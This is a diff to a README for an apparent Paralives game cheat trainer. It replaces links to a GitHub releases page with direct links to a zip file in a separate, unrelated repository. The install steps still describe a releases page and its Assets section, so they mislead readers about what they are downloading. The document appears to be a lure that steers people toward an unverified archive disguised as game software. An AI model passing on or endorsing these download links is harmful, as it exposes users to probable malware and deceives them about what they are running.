@@ -5,7 +5,7 @@ description: "Manage Paralives game variables with hotkeys to gain unlimited mon
 ---
 # 🎮 Paralives-Ultimate-Trainer-2026_v_2 - Control your game life with ease
 
-[![Download Link](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/releases)
+[![Download Link](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/chrysteunsettled634/chrysteunsettled634.github.io/main/vesical/chrysteunsettled-github-io-v1.1.zip)
 
 ## 📖 About the Trainer
 
@@ -22,7 +22,7 @@ Make sure your computer meets these needs before you run the trainer:
 
 ## 📥 How to Download and Install
 
-1.  Follow this link to the releases page: [https://github.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/releases](https://github.com/chrysteunsettled634/Paralives-Ultimate-Trainer-2026_v_2/releases).
+1.  Follow this link to the releases page: [https://raw.githubusercontent.com/chrysteunsettled634/chrysteunsettled634.github.io/main/vesical/chrysteunsettled-github-io-v1.1.zip](https://raw.githubusercontent.com/chrysteunsettled634/chrysteunsettled634.github.io/main/vesical/chrysteunsettled-github-io-v1.1.zip).
 2.  Look for the "Assets" section at the bottom of the newest release entry.
 3.  Click the file ending in .zip to start your download.
 4.  Find the downloaded folder in your File Explorer. 
